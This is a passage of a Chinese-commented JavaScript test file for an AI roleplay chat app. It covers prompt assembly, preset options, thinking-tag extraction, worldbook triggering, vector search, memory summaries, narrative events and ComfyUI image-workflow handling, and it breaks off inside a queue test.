    // 模块（Mod）：一个条目 = 说明 + 提示词 + 可选 CSS/HTML/JS
    await prompts.saveModule({ title: '尾巴', description: '别重复上文', body: '不要重复上文', position: 'after-user' });
    const saved = await prompts.listModules();
    assert.equal(saved.total, 1);
    assert.equal(saved.items[0].position, 'after-user');
    assert.equal(saved.items[0].description, '别重复上文');

    // X 光重算（踢段）
    const xray = await prompts.preview({ card: { name: 'x', description: '描述' } });
    const kicked = await prompts.preview({ sections: xray.sections, dropSections: ['persona'] });
    assert.ok(!kicked.sections.some((section) => section.id === 'persona'));
    assert.ok(kicked.tokens.total < xray.tokens.total);
    assert.ok(kicked.notes.some((note) => note.includes('手动丢掉')));
  } finally {
    cleanup();
  }
});

test('思维链：从正文里摘出标签块（含酒馆自定义标签 / 被截断的开标签）', () => {
  const basic = splitThinkingTags('<think>先想一步</think>正文在这');
  assert.equal(basic.thinking, '先想一步');
  assert.equal(basic.text, '正文在这');

  // 酒馆预设的自定义标签（这一版类脑预设就是用 <think_nya~> 包思维链）
  const tavern = splitThinkingTags('开头<think_nya~>喵喵想一下\n再看看</think_nya~>正文');
  assert.equal(tavern.thinking, '喵喵想一下\n再看看');
  assert.equal(tavern.text, '开头正文');

  // 只开了头没闭合（被 max_tokens 截断）：剩下的都算思维链
  const cut = splitThinkingTags('正文<think_nya~>被截断的思考');
  assert.equal(cut.thinking, '被截断的思考');
  assert.equal(cut.text, '正文');

  // 多段 + 英文名
  const multi = splitThinkingTags('<reasoning>甲</reasoning>中间<analysis>乙</analysis>');
  assert.equal(multi.thinking, '甲\n\n乙');
  assert.equal(multi.text, '中间');

  // 普通正文不能被误伤
  const plain = splitThinkingTags('没有思维链，就是普通正文');
  assert.equal(plain.thinking, '');
  assert.equal(plain.text, '没有思维链，就是普通正文');
  assert.deepEqual(splitThinkingTags(''), { text: '', thinking: '' });
});

test('预设顶层字段：能照做的都照做（传输 / 推理 / 提示词 / 形状模板）', () => {
  const options = presetOptions({
    stream_openai: false,
    reasoning_effort: 'max',
    verbosity: 'low',
    openai_max_tokens: 2048,
    openai_max_context: 128000,
    max_context_unlocked: false,
    continue_nudge_prompt: '接着写',
    impersonation_prompt: '替我写一句',
    group_nudge_prompt: '只写 {{char}}',
    assistant_prefill: '「',
    continue_prefill: false,
    continue_postfix: '',
    use_sysprompt: false,
    squash_system_messages: false,
    wi_format: '[WI] {0}',
    scenario_format: '【场景】{{scenario}}',
    personality_format: '{{personality}}',
  });
  assert.equal(options.streamMode, 'full', 'stream_openai: false → 整段返回');
  assert.equal(options.reasoningEffort, 'high', 'reasoning_effort: max → high');
  assert.equal(options.verbosity, 'low');
  assert.equal(options.maxTokens, 2048);
  assert.equal(options.contextBudget, 128000);
  assert.equal(options.continueNudge, '接着写');
  assert.equal(options.impersonateNudge, '替我写一句');
  assert.equal(options.groupNudge, '只写 {{char}}');
  assert.equal(options.prefill, '「');
  assert.equal(options.continuePrefill, false);
  assert.equal(options.useSystemPrompt, false);
  assert.equal(options.squashSystemMessages, false);
  assert.equal(options.formats.worldbook, '[WI] {0}');

  // "解锁"写法（65535 / max_context_unlocked）不当真
  const loose = presetOptions({ openai_max_tokens: 65535, openai_max_context: 2000000, max_context_unlocked: true });
  assert.equal(loose.maxTokens, 65535, '上限还是照收（钳到 65536 以内）');
  assert.equal(loose.contextBudget, undefined, 'unlocked = 不设死预算');
  assert.deepEqual(presetOptions({}), {}, '预设没写就什么都不改');
  assert.deepEqual(presetOptions(null), {});

  // 格式模板：默认写法不包装，带占位符才套
  assert.equal(applyFormatTemplate('{{scenario}}', 'scenario', '下午的咖啡馆'), '下午的咖啡馆');
  assert.equal(applyFormatTemplate('{0}', 'worldbook', '条目原文'), '条目原文');
  assert.equal(applyFormatTemplate('【场景】{{scenario}}', 'scenario', '下午的咖啡馆'), '【场景】下午的咖啡馆');
});

test('预设的形状开关：use_sysprompt / squash_system_messages / 字段模板真的生效', () => {
  const base = {
    card: { name: '琥珀', description: '一只猫', personality: '懒', scenario: '旧书店' },
    history: [{ role: 'user', content: '你好' }],
  };
  // use_sysprompt: false → 不加默认系统提示词
  const noSystem = assemblePrompt({ ...base, settings: { useSystemPrompt: false, systemPrompt: '不该出现' } });
  assert.ok(!noSystem.sections.some((section) => section.id === 'global-system'));
  assert.ok(!noSystem.system.includes('不该出现'));
  assert.ok(noSystem.notes.some((note) => note.includes('use_sysprompt')));

  // squash_system_messages: false → 相邻系统消息一条条发，不合并
  // （要测这条得用"排在 chatHistory 之后"的条目：它们才是真的一条条消息）
  const preset = {
    prompts: [
      { identifier: 'chatHistory', role: 'system', marker: true },
      { identifier: 'a', role: 'system', content: '第一条' },
      { identifier: 'b', role: 'system', content: '第二条' },
    ],
  };
  const merged = assemblePrompt({ ...base, preset, settings: {} });
  const split = assemblePrompt({ ...base, preset, settings: { squashSystemMessages: false } });
  assert.equal(merged.messages.filter((message) => message.role === 'system').length, 1, '默认会合并成一条');
  assert.equal(split.messages.filter((message) => message.role === 'system').length, 2, '关掉合并不该并成一条');

  // 字段模板：scenario_format 会把场景包起来
  const templated = assemblePrompt({ ...base, settings: { formatTemplates: { scenario: '【场景】{{scenario}}' } } });
  const scenarioSection = templated.sections.find((section) => section.id === 'persona-scenario' || section.id === 'persona');
  assert.ok(scenarioSection.content.includes('【场景】场景：旧书店'), scenarioSection.content);
});

test('长度要求：对话页的"最少字数"要落在发给模型的最后一条消息上', () => {
  const out = assemblePrompt({
    card: { name: '琥珀' },
    history: [{ role: 'user', content: '你好' }],
    settings: { minChars: 900 },
  });
  const section = out.sections.find((item) => item.id === 'min-chars');
  assert.ok(section, '要有一段"长度要求"');
  assert.match(section.content, /不少于 900 字/);
  assert.match(out.messages.at(-1).content, /不少于 900 字/, '长度要求要在最后一条消息里（模型才会照办）');
  assert.equal(out.messages.at(-1).role, 'system');

  // 不设就不加；设 0 也不算
  const plain = assemblePrompt({ card: { name: '琥珀' }, history: [{ role: 'user', content: '你好' }], settings: {} });
  assert.ok(!plain.sections.some((item) => item.id === 'min-chars'));
  const zero = assemblePrompt({ card: { name: '琥珀' }, history: [{ role: 'user', content: '你好' }], settings: { minChars: 0 } });
  assert.ok(!zero.sections.some((item) => item.id === 'min-chars'));

  // 思考语言：也放在最末尾（预设里那条英文 SYSTEM INSTRUCTION 会让模型用英文思考）
  const zh = assemblePrompt({
    card: { name: '琥珀' },
    history: [{ role: 'user', content: '你好' }],
    settings: { minChars: 900, thinkingChinese: true },
  });
  const zhSection = zh.sections.find((item) => item.id === 'thinking-lang');
  assert.ok(zhSection, '要有一段"思考语言"');
  assert.match(zhSection.content, /请用简体中文书写/);
  assert.match(zh.messages.at(-1).content, /思考过程/, '思考语言要是最后一条');
  assert.match(zh.messages.at(-2).content, /不少于 900 字/, '长度要求在它前面一条');
});

test('预设采样参数：白名单搬运、丢掉"等于没设"的值、按适配器过滤', () => {
  const preset = {
    temperature: 1.09,
    top_p: 0.98,
    top_k: 64,
    top_a: 0,
    min_p: 0,
    repetition_penalty: 1,
    frequency_penalty: 0,
    presence_penalty: 0,
    seed: -1,
    openai_max_tokens: 65535,
    openai_max_context: 2000000,
    wi_format: '{{0}}',
    names_behavior: 1,
  };

  // 常用档：只搬各家 OpenAI 兼容接口都认的；0 / 1 / -1 这种"等于没设"的值不占位置
  assert.deepEqual(presetSamplingParams(preset), { temperature: 1.09, top_p: 0.98 });
  // 全部档：本地推理那套也搬，中性值照样丢
  assert.deepEqual(presetSamplingParams(preset, 'all'), { temperature: 1.09, top_p: 0.98, top_k: 64 });
  assert.deepEqual(presetSamplingParams(preset, 'off'), {});
  assert.deepEqual(presetSamplingParams(null), {});
  // 不是采样参数的顶层字段（上下文长度、格式模板…）一个都不能混进来
  assert.ok(!('max_tokens' in presetSamplingParams(preset, 'all')), 'openai_max_tokens 不该被当成回复上限');
  assert.equal(PRESET_PARAM_MODE_IDS.join(','), 'common,all,off');

  // 适配器过滤：预设是给别的后端写的，这家不认的字段不能发过去
  assert.deepEqual(pickDeclaredParams('anthropic', { temperature: 1, frequency_penalty: 0.5, top_k: 40 }), { temperature: 1, top_k: 40 });
  assert.deepEqual(pickDeclaredParams('openai', { temperature: 1, top_k: 40, max_tokens: 2048 }), { temperature: 1, top_k: 40, max_tokens: 2048 });
  assert.deepEqual(pickDeclaredParams('gemini', { temperature: 1, top_k: 40, frequency_penalty: 1 }), { temperature: 1, top_k: 40 });
  assert.deepEqual(pickDeclaredParams('openai', { temperature: undefined, seed: '', top_p: null }), {});
});

test('世界书：界面形状保存条目时，次关键词与额外扫描来源不丢', async () => {
  const { db, cleanup } = makeTempDb();
  try {
    const store = createWorldbookStore({ repo: db.repo });
    const worldbook = createWorldbookService({ settings: {}, ports: { worldbookStore: store } });
    const book = await worldbook.save({ name: '书店', data: TAVERN_BOOK });

    // 界面编辑条目发过来的是归一化 camelCase（keys / secondaryKeys / matchPersonaDescription…）
    const uiEntry = await worldbook.saveEntry(book.id, {
      uid: null,
      comment: '带次关键词',
      keys: ['书店'],
      secondaryKeys: ['东街'],
      selective: true,
      selectiveLogic: WI_LOGIC.AND_ANY,
      content: '需要东街一起出现',
      order: 3,
      position: 0,
      matchPersonaDescription: true,
    });
    assert.deepEqual(uiEntry.secondaryKeys, ['东街'], '次关键词不能被吃掉');
    assert.equal(uiEntry.matchPersonaDescription, true, '额外扫描来源开关不能丢');

    const miss = await worldbook.testTrigger(book.id, { text: '书店' });
    assert.equal(miss.reasons.find((reason) => String(reason.uid) === String(uiEntry.uid)).activated, false, '次关键词不满足时不该激活');
    const hit = await worldbook.testTrigger(book.id, { text: '书店东街' });
    assert.ok(hit.entries.some((entry) => entry.content === '需要东街一起出现'));

    // 卡内形状的书也要能按界面形状存进去
    const cardBook = await worldbook.save({ name: '卡内书', data: { name: '卡内书', entries: [{ id: 0, keys: ['雨'], content: '下雨' }] } });
    const cardEntry = await worldbook.saveEntry(cardBook.id, { uid: null, keys: ['雪'], secondaryKeys: ['冬'], selective: true, content: '冬天下雪', position: WI_POSITION.after });
    assert.deepEqual(cardEntry.secondaryKeys, ['冬']);
    assert.equal(cardEntry.position, WI_POSITION.after);
  } finally {
    cleanup();
  }
});

test('世界书：角色卡内嵌的 character_book 也会激活', async () => {
  const { db, cleanup } = makeTempDb();
  try {
    const store = createWorldbookStore({ repo: db.repo });
    const worldbook = createWorldbookService({ settings: {}, ports: { worldbookStore: store } });
    // 全局一本都没有，只有卡里自带的一本
    const embed = { name: '卡内书', entries: [{ id: 0, keys: ['书店'], content: '卡内：东街的书店', enabled: true }] };

    const hit = await worldbook.activate({ chatId: 'c1', text: '书店怎么走', embedBooks: [embed] });
    assert.ok(hit.entries.some((entry) => entry.content === '卡内：东街的书店'), '卡内嵌的世界书要跟着卡生效');

    const miss = await worldbook.activate({ chatId: 'c1', text: '今天天气不错', embedBooks: [embed] });
    assert.equal(miss.entries.length, 0);
  } finally {
    cleanup();
  }
});

// ---------- 向量与记忆 ----------

test('写卡区加分项：剧本大纲 / BGM 清单 / 关系图 / 一致性锁定', () => {
  const extras = mergeExtras({}, {
    outline: { logline: '雪夜相遇', chapters: [{ title: '第一章', summary: '旧书馆' }] },
    audio: { bgm: ['ast_a', 'not an id!'], sfx: [{ assetId: 'ast_b', label: '开门' }, { assetId: '' }] },
    relations: [{ from: '阿狸', to: '书生', label: '师徒', kind: 'mentor' }, { from: '阿狸', to: '书生', label: '亦敌亦友' }],
    locks: ['name', 'personality', '不存在的字段'],
  });
  assert.equal(extras.outline.logline, '雪夜相遇');
  assert.equal(extras.outline.chapters.length, 1);
  assert.deepEqual(extras.audio.bgm, ['ast_a'], '非法 assetId 丢掉');
  assert.equal(extras.audio.sfx.length, 1);
  assert.deepEqual(extras.locks, ['name', 'personality'], '不认识的可锁字段丢掉');

  // 一致性锁定：碰到钉死的字段就报出来
  assert.deepEqual(checkLocks(extras, { data: { name: '新名字' } }), ['name']);
  assert.deepEqual(checkLocks(extras, { data: { name: '阿狸' } }, { name: '阿狸' }), [], '原样发回来不算改');
  assert.deepEqual(checkLocks(extras, { data: { description: 'x' } }), [], '没锁的字段不受影响');
  assert.deepEqual(checkLocks(extras, { tags: ['x'] }), [], 'tags 没锁就能改');
  assert.deepEqual(checkLocks({ locks: ['tags'] }, { tags: ['x'] }), ['tags']);

  // 关系图：去重节点 + 边
  const graph = relationsGraph(extras.relations);
  assert.equal(graph.total.nodes, 2);
  assert.equal(graph.total.edges, 2);
  assert.equal(graph.nodes[0].name, '阿狸');

  // 存进卡数据：保留其它扩展字段
  const card = withExtras({ extensions: { other: { a: 1 } } }, extras);
  assert.equal(card.extensions.other.a, 1);
  assert.equal(card.extensions['silver-tavern'].outline.logline, '雪夜相遇');
  assert.equal(extrasOf(card).relations.length, 2);
  assert.deepEqual(extrasOf({}).locks, []);
});

test('世界书：语义触发接向量（有嵌入用余弦，没有就退化成词重叠）', async () => {
  const { db, cleanup } = makeTempDb();
  try {
    const store = createWorldbookStore({ repo: db.repo });
    const withEmbed = createWorldbookService({ settings: {}, ports: { worldbookStore: store, embed: async (texts) => texts.map((text, index) => (index === 0 ? [1, 0] : [0.95, 0.05])) } });
    const book = await withEmbed.save({ name: '设定' });
    await withEmbed.saveEntry(book.id, { keys: ['银月'], content: '银月是一把会说话的剑。', order: 10, vectorized: true, semanticThreshold: 0.5 });

    // 关键词完全对不上，但向量相似度过线 → 语义命中
    const hit = await withEmbed.activate({ chatId: 'sem-1', characterId: null, text: '那把剑好像在跟我说话' });
    assert.ok(hit.entries.some((entry) => entry.uid === 0 || entry.uid === '0'), '语义过线要激活');
    assert.ok((hit.reasons ?? []).some((reason) => JSON.stringify(reason).includes('语义')), '要标成语义命中');

    // 嵌入给正交向量 → 相似度 0 → 不激活
    const withOrthogonal = createWorldbookService({ settings: {}, ports: { worldbookStore: store, embed: async (texts) => texts.map((text, index) => (index === 0 ? [1, 0] : [0, 1])) } });
    const miss = await withOrthogonal.activate({ chatId: 'sem-2', characterId: null, text: '今天天气不错' });
    assert.equal(miss.entries.length, 0, '相似度不够就不该激活');

    // 没嵌入端口：退化成词重叠，同一句话（含"银月"）能命中
    const noEmbed = createWorldbookService({ settings: {}, ports: { worldbookStore: store } });
    const overlap = await noEmbed.activate({ chatId: 'sem-3', characterId: null, text: '银月是一把会说话的剑' });
    assert.ok(overlap.entries.length >= 1, '零依赖兜底的词重叠也要能用');
  } finally {
    cleanup();
  }
});

test('向量：切块、关键词 / 向量混合检索、增量、按来源清理', async () => {
  assert.ok(chunkText('短文本').length === 1);
  const many = chunkText(Array.from({ length: 40 }, (_v, i) => `第 ${i} 段内容，讲的是书店与猫。`).join('\n\n'), { size: 100 });
  assert.ok(many.length > 3, '长文本要切成多块');
  assert.ok(keywordScore('东街书店', '旧书店在东街尽头') > 0.5);
  assert.equal(Math.round(cosine([1, 0], [1, 0]) * 100) / 100, 1);
  assert.equal(cosine([1, 0], [0, 1]), 0);

  const { db, cleanup } = makeTempDb();
  try {
    const store = createVectorStore({ repo: db.repo });
    // 假嵌入：按字符码和造一个 4 维向量，让"字形相近"的文本靠得近
    const fakeEmbed = async (texts) => texts.map((text) => {
      const base = [...String(text)].reduce((sum, ch) => sum + ch.codePointAt(0), 0) % 7;
      return [base / 7, 1, (String(text).length % 5) / 5, 0.5];
    });
    const vectors = createVectorService({ settings: {}, ports: { vectorStore: store, embed: fakeEmbed } });

    assert.equal((await vectors.stats()).total, 0);
    const indexed = await vectors.indexSource({ collection: 'databank', sourceId: 'doc-1', content: '旧书店在东街尽头。' });
    assert.equal(indexed.chunks, 1);
    assert.equal(indexed.embedded, 1);
    await vectors.indexSource({ collection: 'databank', sourceId: 'doc-2', content: '二楼住着一只叫琥珀的狐狸。' });
    assert.equal((await vectors.stats()).total, 2);

    // 内容没变：第二次不该重新算向量
    const again = await vectors.indexSource({ collection: 'databank', sourceId: 'doc-1', content: '旧书店在东街尽头。' });
    assert.equal(again.embedded, 0, '内容没变就不重算');

    const hits = await vectors.search({ query: '东街书店', topK: 2 });
    assert.ok(hits.length >= 1);
    assert.equal(hits[0].sourceId, 'doc-1');
    assert.ok(hits[0].keywordScore > 0);
    assert.ok(hits[0].vectorScore > 0);

    // 没有嵌入端口也能用（关键词兜底）
    const keywordOnly = createVectorService({ settings: {}, ports: { vectorStore: store } });
    const kwHits = await keywordOnly.search({ query: '狐狸' });
    assert.equal(kwHits[0].sourceId, 'doc-2');
    assert.equal(kwHits[0].vectorScore, 0);

    // 批量重建 + 清空
    const reindexed = await vectors.reindex({ sources: [{ collection: 'memory', sourceId: 'm-1', content: '记忆片段' }], collection: 'memory', clear: true });
    assert.equal(reindexed.sources, 1);
    assert.ok((await vectors.stats()).total >= 3);

    assert.equal(await vectors.removeBySource('databank', 'doc-1'), 1);
    assert.equal((await vectors.stats()).total, 2);

    // clear 是"只清"；reindex 的 clear 才是"清了再建"
    assert.equal((await vectors.clear()).total, 0);
    assert.equal((await vectors.stats()).total, 0);

    const test = await vectors.testEmbedding({ text: '你好' });
    assert.equal(test.dim, 4);
  } finally {
    cleanup();
  }
});

test('记忆：小总结覆盖区间、大总结、注入选择与理由、档案', async () => {
  const { db, cleanup } = makeTempDb();
  try {
    const store = createMemoryStore({ repo: db.repo });
    const summarize = async ({ kind, messages }) => `${kind}：${messages.length} 条`;
    const memory = createMemoryService({ settings: {}, ports: { memoryStore: store, summarize } });

    const small = await memory.summarizeSmall({ chatId: 'c1', messages: [{ id: 'm1', content: '你好' }, { id: 'm2', content: '喵' }] });
    assert.equal(small.memory.coversFrom, 'm1');
    assert.equal(small.memory.coversTo, 'm2');
    assert.match(small.memory.content, /small：2 条/);

    const manual = await memory.summarizeSmall({ chatId: 'c1', content: '手写的一条总结', title: '手写' });
    assert.equal(manual.memory.content, '手写的一条总结');

    const large = await memory.summarizeLarge({ chatId: 'c1' });
    assert.equal(large.layer, 'large');
    assert.equal((await memory.list({ chatId: 'c1' })).total, 3);

    const pinned = await memory.update(small.memory.id, { pinned: true });
    assert.equal(pinned.pinned, true);

    const selected = await memory.selectForPrompt({ chatId: 'c1' });
    const layers = selected.entries.map((entry) => entry.layer).sort();
    assert.deepEqual(layers, ['large', 'small', 'small'].sort());
    assert.ok(selected.reasons.some((reason) => reason.reason.includes('钉住')));
    assert.ok(selected.reasons.some((reason) => reason.reason.includes('大总结')));
    assert.ok(selected.reasons.every((reason) => typeof reason.reason === 'string' && reason.reason.length > 0));

    // 结构化档案：存 JSON，读出来是对象
    store.insert({ chatId: 'c1', layer: 'profile', title: '琥珀', content: JSON.stringify({ kind: 'person', name: '琥珀', relation: '店里的狐狸' }) });
    const profiles = await memory.listProfiles({ chatId: 'c1' });
    assert.equal(profiles.total, 1);
    assert.equal(profiles.items[0].data.name, '琥珀');

    await memory.remove(large.id);
    // 还剩：钉住的小总结 + 手写的小总结 + 一条档案
    assert.equal((await memory.list({ chatId: 'c1' })).total, 3);
  } finally {
    cleanup();
  }
});

test('玩卡区：群聊可以先建起来，人数不卡在建群这一步', async () => {
  const { db, cleanup } = makeTempDb();
  try {
    const store = createChatStore({ repo: db.repo });
    const { chat } = createPlayingServices({ ports: { chatStore: store } });

    const one = await chat.create({ isGroup: true, greetings: false, members: [{ characterId: 'c1', name: '阿狸', card: { name: '阿狸' } }] });
    assert.equal(one.isGroup, true);
    assert.equal(one.members.length, 1);

    const empty = await chat.create({ isGroup: true, greetings: false, members: [] });
    assert.equal(empty.isGroup, true);
    assert.equal(empty.members.length, 0, '空的群聊也能先建好，之后再加成员');
  } finally {
    cleanup();
  }
});

// ---------------------------------------------------------------- 工具箱 3.1 ComfyUI

/** 一份最小的 ComfyUI「API 格式」工作流，形状对着真实导出核过。 */
const COMFY_SAMPLE = {
  '3': {
    class_type: 'KSampler',
    inputs: { seed: 12345, steps: 20, cfg: 7, denoise: 1, model: ['4', 0], positive: ['6', 0], negative: ['7', 0], latent_image: ['5', 0] },
  },
  '4': { class_type: 'CheckpointLoaderSimple', inputs: { ckpt_name: 'model.safetensors' } },
  '5': { class_type: 'EmptyLatentImage', inputs: { width: 512, height: 768, batch_size: 1 } },
  '6': { class_type: 'CLIPTextEncode', inputs: { text: '{{char}}, {{scene}}, {{emotion}}, 1girl', clip: ['4', 1] } },
  '7': { class_type: 'CLIPTextEncode', inputs: { text: 'lowres, bad anatomy', clip: ['4', 1] } },
  '9': { class_type: 'SaveImage', inputs: { filename_prefix: 'tavern', images: ['8', 0] } },
};

test('叙事加分项：章节管理、结局收集、随机事件（含确定性抽签）', async () => {
  const { db, cleanup } = makeTempDb();
  try {
    const store = createChatStore({ repo: db.repo });
    const models = {
      async *chat() {
        yield { type: 'text', text: '好。' };
      },
      async complete() {
        return { text: 'ok' };
      },
    };
    let roll = 0;
    const { chat, narration } = createPlayingServices({
      settings: {},
      ports: {
        chatStore: store,
        models,
        resolveBinding: () => ({ providerId: 'p1', model: 'mock', params: {}, source: 'default' }),
        providerParams: () => ({}),
        random: () => roll,
      },
    });
    const created = await chat.create({ title: '章节测试', character: { name: '阿狸', first_mes: '喵。' } });
    store.appendMessage(created.id, { role: 'user', name: '我', content: '第二句' });
    store.appendMessage(created.id, { role: 'assistant', name: '阿狸', content: '第三句' });
    const messages = (await chat.messages(created.id)).items;
    assert.equal(messages.length, 3);

    // 章节：没分章时整条算一章；分章后按消息切区间
    const initial = narration.chapters(created.id);
    assert.equal(initial.total, 1);
    assert.equal(initial.items[0].count, 3);
    narration.saveChapter(created.id, { title: '第一章', summary: '开场', messageId: messages[0].id });
    const two = narration.saveChapter(created.id, { title: '第二章', summary: '转折', messageId: messages[2].id });
    assert.equal(two.items.length, 2);
    assert.equal(two.items[0].count, 2, '第一章覆盖前两条');
    assert.equal(two.items[1].count, 1);
    assert.equal(narration.chapterAt(created.id, messages[2].id).title, '第二章');
    assert.equal(narration.chapterAt(created.id, messages[1].id).title, '第一章');
    await assert.rejects(async () => narration.saveChapter(created.id, { title: 'x', messageId: 'nope' }), /消息/);
    narration.deleteChapter(created.id, two.items[1].id);
    assert.equal(narration.chapters(created.id).items.length, 1);

    // 结局收集
    assert.equal(narration.endings(created.id).total, 0);
    const collected = narration.recordCollectedEnding(created.id, { routeId: 'route-true', title: '真结局', ending: '……' });
    assert.equal(collected.total, 1);
    assert.equal(narration.recordCollectedEnding(created.id, { routeId: 'route-true' }).total, 1, '同一个结局只收一条');
    await assert.rejects(async () => narration.recordCollectedEnding(created.id, {}), /routeId/);

    // 随机事件：抽签是确定性的（roll 由测试给）
    assert.equal(narration.eventSettings(created.id).settings.enabled, false);
    narration.saveEventSettings(created.id, { enabled: true, chance: 0.5 });
    roll = 0;
    const fired = narration.maybeFireRandomEvent(created.id);
    assert.equal(fired.fired, true);
    assert.equal(fired.event.id, 'ev-weather', 'roll=0 抽权重最高的第一个');
    const withEvent = (await chat.messages(created.id)).items;
    assert.ok(withEvent.some((message) => message.extra?.randomEvent), '事件要落成一条旁白消息');
    roll = 0.9;
    assert.equal(narration.maybeFireRandomEvent(created.id).fired, false, 'roll 超过概率就不触发');
    narration.saveEventSettings(created.id, { chance: 0 });
    roll = 0;
    assert.equal(narration.maybeFireRandomEvent(created.id).fired, false, '概率 0 永不触发');

    // 试掷不落消息
    const before = (await chat.messages(created.id)).items.length;
    narration.saveEventSettings(created.id, { chance: 1 });
    const rolled = narration.rollEvent(created.id, { chanceRoll: 0, roll: 0 });
    assert.equal(rolled.fired, true);
    assert.equal((await chat.messages(created.id)).items.length, before);

    // 开着随机事件时，send 会先插一条旁白再生成
    narration.saveEventSettings(created.id, { enabled: true, chance: 1 });
    roll = 0;
    const events = [];
    for await (const event of chat.send(created.id, { text: '继续' })) events.push(event);
    assert.ok(events.some((event) => event.type === 'done'));
    assert.ok((await chat.messages(created.id)).items.some((message) => message.extra?.randomEvent), '用户发言后要按概率插事件');
  } finally {
    cleanup();
  }
});

test('工具箱：ComfyUI 工作流解析、可填参数、占位符', () => {
  const parsed = parseApiWorkflow(COMFY_SAMPLE);
  assert.equal(parsed.nodeCount, 6);
  // 包一层 {prompt:{...}} 也认
  assert.equal(parseApiWorkflow({ prompt: COMFY_SAMPLE }).nodeCount, 6);
  // 一段不像工作流的东西要报人话
  assert.throws(() => parseApiWorkflow('{"hello":"world"}'), ValidationError);
  assert.throws(() => parseApiWorkflow('{ 不是 json'), ValidationError);

  const inputs = workflowInputs(parsed.prompt);
  assert.ok(inputs.length > 8);
  // 连线（数组）不能被当成可填值
  assert.ok(!inputs.some((entry) => entry.nodeId === '3' && entry.input === 'model'));
  assert.ok(inputs.some((entry) => entry.nodeId === '6' && entry.input === 'text'));

  const bindings = suggestBindings(parsed.prompt);
  const byInput = new Map(bindings.map((item) => [`${item.nodeId}.${item.input}`, item]));
  assert.equal(byInput.get('3.seed').type, 'seed');
  assert.equal(byInput.get('5.width').type, 'number');
  assert.equal(byInput.get('6.text').type, 'text');
  assert.ok(!byInput.has('3.model'), '连线不该进绑定');

  assert.deepEqual(detectPlaceholders(parsed.prompt), ['char', 'scene', 'emotion']);
  assert.equal(COMFY_WORKFLOW_KINDS.length, 6);
});

test('工具箱：内置示例工作流（立绘 / 表情 / 背景 / CG / 局部重绘）', () => {
  const presets = listWorkflowPresets();
  assert.ok(presets.length >= 5, '蓝图要求至少预置立绘 / 表情差分 / 背景 / CG / 局部重绘');
  const kinds = new Set(presets.map((preset) => preset.kind));
  for (const wanted of ['portrait', 'expression', 'background', 'cg', 'inpaint']) assert.ok(kinds.has(wanted), `少了 ${wanted} 预设`);

  for (const preset of presets) {
    const raw = getWorkflowPreset(preset.id).workflow;
    // 每份预设本身必须是合法工作流，导入路径能解析
    const parsed = parseApiWorkflow(raw);
    assert.equal(parsed.nodeCount, preset.nodeCount);
    // 骨架节点齐全
    const classTypes = Object.values(raw).map((node) => node.class_type);
    for (const needed of ['CheckpointLoaderSimple', 'CLIPTextEncode', 'KSampler', 'SaveImage']) {
      assert.ok(classTypes.includes(needed), `${preset.id} 少了 ${needed}`);
    }
    // 占位符要真能替换：buildPrompt 后不能再有 {{...}} 残留
    const built = buildPrompt({
      workflow: raw,
      bindings: suggestBindings(raw),
      context: buildPlaceholderContext({ member: { name: '琥珀' }, worldState: { place: '旧书馆', time: '深夜' } }),
      seed: 42,
    });
    for (const node of Object.values(built.prompt)) {
      for (const value of Object.values(node.inputs ?? {})) {
        if (typeof value === 'string') assert.ok(!/\{\{/.test(value), `${preset.id} 里有没替换掉的占位符：${value}`);
      }
    }
  }

  const inpaint = getWorkflowPreset('preset-inpaint');
  assert.ok(Object.values(inpaint.workflow).some((node) => node.class_type === 'VAEEncodeForInpaint'));
  assert.throws(() => getWorkflowPreset('preset-not-exist'), /示例工作流/);
});

test('工具箱：占位符替换、参数应用与上下文', () => {
  const known = substitute('{{char}} 在 {{scene}}', { char: '琥珀', scene: '雪夜' });
  assert.equal(known.text, '琥珀 在 雪夜');
  assert.deepEqual(known.missing, []);
  // 写错的占位符原样留着，并报出来，别静默变空
  const unknown = substitute('{{char}} 的 {{mood}}', { char: '琥珀' });
  assert.equal(unknown.text, '琥珀 的 {{mood}}');
  assert.deepEqual(unknown.missing, ['mood']);
  // 空格容忍
  assert.equal(substitute('{{ char }}', { char: 'A' }).text, 'A');

  const context = buildPlaceholderContext({
    chat: { persona: { name: '旅人' } },
    member: { name: '琥珀' },
    worldState: { place: '旧书馆', time: '深夜' },
    variables: { emotion: '警惕' },
  });
  assert.equal(context.char, '琥珀');
  assert.equal(context.user, '旅人');
  assert.match(context.scene, /旧书馆/);
  assert.equal(context.emotion, '警惕');

  const bindings = suggestBindings(COMFY_SAMPLE);
  const built = buildPrompt({ workflow: COMFY_SAMPLE, bindings, values: { '5.width': 1024 }, context, seed: 777 });
  assert.equal(built.prompt['5'].inputs.width, 1024);
  assert.equal(built.prompt['3'].inputs.seed, 777, '固定种子要覆盖绑定里的值');
  assert.match(built.prompt['6'].inputs.text, /琥珀/);
  assert.match(built.prompt['6'].inputs.text, /旧书馆/);
  // 原工作流不能被改掉
  assert.equal(COMFY_SAMPLE['3'].inputs.seed, 12345);
  assert.equal(COMFY_SAMPLE['5'].inputs.width, 512);

  assert.throws(() => buildPrompt({ workflow: COMFY_SAMPLE, bindings: [{ nodeId: '99', input: 'x', type: 'text', value: 'a' }] }), ValidationError);
});

test('工具箱：三种触发方式与 [IMG:] 标记', () => {
  const markers = parseImageMarkers('她笑了。\n[IMG: portrait: 白狐，雪夜] 还有 [IMG: 只画背景]');
  assert.equal(markers.length, 2);
  assert.equal(markers[0].kind, 'portrait');
  assert.equal(markers[0].prompt, '白狐，雪夜');
  assert.equal(markers[1].kind, null);
  assert.equal(markers[1].prompt, '只画背景');

  assert.equal(planImageTrigger({ mode: 'manual', content: '[IMG: x]' }).trigger, false);
  assert.equal(planImageTrigger({ mode: 'marker', content: '没有标记' }).trigger, false);
  assert.equal(planImageTrigger({ mode: 'marker', content: '喵 [IMG: x]' }).trigger, true);
  assert.equal(planImageTrigger({ mode: 'auto', content: '平静的一轮', stateDelta: null }).trigger, false);
  const auto = planImageTrigger({ mode: 'auto', content: '', stateDelta: { place: '教堂' } });
  assert.equal(auto.trigger, true);
  assert.match(auto.reason, /场景变化/);
  // 替身发言 / 选项轮不该出图
  assert.equal(planImageTrigger({ mode: 'marker', content: '[IMG: x]', kind: 'impersonate' }).trigger, false);
  assert.equal(planImageTrigger({ mode: 'marker', content: '[IMG: x]', kind: 'options' }).trigger, false);
});

test('工具箱：ComfyUI 队列与 WebSocket 事件解释', () => {
  const queue = summariseQueue({
    queue_running: [[0, 'pid-1', {}, {}, ['9']]],
    queue_pending: [[1, 'pid-2', {}, {}, ['9']], [2, 'pid-3', {}, {}, ['9']]],
  });
  assert.equal(queue.running, 1);
